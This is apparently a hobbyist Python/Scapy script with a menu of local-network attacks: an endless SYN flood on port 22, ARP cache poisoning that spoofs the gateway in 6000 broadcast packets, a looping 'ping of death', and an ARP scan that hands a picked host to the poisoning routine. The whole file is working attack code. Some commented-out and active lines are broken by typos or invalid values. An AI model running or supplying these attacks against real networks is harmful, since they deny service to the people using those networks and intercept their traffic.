#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
import time

def send_tcp_syn_packet(pdst, ptcpdport):

    
    ip_hdr = IP()
    tcp_hdr = TCP()
 
    ip_hdr.src = "192.168.*.*"
    tcp_hdr.sport = random.randint(1, 65535)
    tcp_hdr.flags = 'S'
 
    ip_hdr.dst = pdst
    tcp_hdr.dport = ptcpdport
    send(ip_hdr/tcp_hdr,verbose = 0)

    '''
    srcvalue = '%i.%i.%i.%i' % (
        random.randint(1, 254),
        random.randint(1, 254),
        random.randint(1, 254),
        random.randint(1, 254)
    )
    send(IP(dst = pdst,src = "192.168.*.*")/TCP(dport = ptcpdport,flags = "S"))
    '''

def send_arp_cache_poison(victimAddr,attackAddr,gatewayAddr):
#    arpcachepoison(victimAddr,attackAddr,interval=0.1)
    '''
     vicmac      = getmacbyip(victimAddr)
     gatewaymac  = getmacbyip(gatewayAddr)
     attackmac   = getmacbyip(attackAddr) 
#    cheat victim user
     sendp(Ether(dst=vicmac.hwsrc)/ARP(op="is-at",psrc=attackAddr,pdst=victimAddr),inter=RanNum(10,30),loop=1)
#    cheat gateway
     sendloop(Ehter(dst=gatewaymac.hwsrc)/ARP(op=2,psrc=victim,hwsrc=attackmac.hwsrc,pdst=gatewayAddr))
     '''
#   victim's arp cache has been substituded. The gateway's IP(192.168.0.1) mapped to attack's hardware address.
    p1=Ether(dst="ff:ff:ff:ff:ff:ff",src="3c:22:fb:11:ac:b1")/ARP(pdst=victimAddr,psrc=gatewayAddr)
    for i in range(6000):
        sendp(p1)
        time.sleep(0.1)
        
def send_ping_of_death(victimAddr):
    send(fragment(IP(dst=victimAddr)/ICMP()/"X"*60000))

def send_arp_probe():
#    print(show_interfaces())
#    wifi='Realtek 8821AE Wireless LAN 802.11ac PCI-E NIC'
#   The name of network card of MacBook is usually called 'en0'  
    wifi = 'en0'
    #模拟发包,向整个网络发包，如果有回应，则表示活跃的主机
    p=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='192.168.1.0/24')
    #ans表示收到的包的回复
    ans,unans=srp(p,iface=wifi,timeout=5)
     
    print("一共扫描到%d台主机："%len(ans))
     
    #将需要的IP地址和Mac地址存放在result列表中
    result=[]
    ipList=[]
    for s,r in ans:
        #解析收到的包，提取出需要的IP地址和MAC地址
        result.append([r[ARP].psrc,r[ARP].hwsrc])
    for s,r in ans:
        ipList.append(r[ARP].psrc)
    #将获取的信息进行排序，看起来更整齐一点
    result.sort()
    #打印出局域网中的主机
    for ip,mac in result:
        print(ip,'------>',mac)
    for i in range(0,len(ipList)):
        print("choose %d "%i,ipList[i])
#    print('\n the number must between 0 and ',(len(ipList)-1))
    choseNumber=int(input("\nPlease input the number that you choose:"))
    if  choseNumber<len(ipList):
        AttackAddr = ipList[choseNumber]
        send_arp_cache_poison(AttackAddr,"192.168.1.6","192.168.1.1")
    else:
        print('The number you choose is invalid')


def main():
    while True:
        print("1.tcp_syn 2.arp_cache_poison 3.ping of death 4.arp_probe\n")
        num = float(input("Please input the command: "))
        if num == 1:
            while 1:
                send_tcp_syn_packet("192.168.100.1",22)
        elif num == 2:
            send_arp_cache_poison("192.168.0.101","192.168.0.10","192.168.0.1")
        elif num == 3:
            while 1:
                send_ping_of_death("192.168.0.103")
        elif num == 4:
            send_arp_probe()
        elif num == 9:
            break
        else: 
            print("The operation is not exist!\n")
if __name__ == "__main__":
    main()


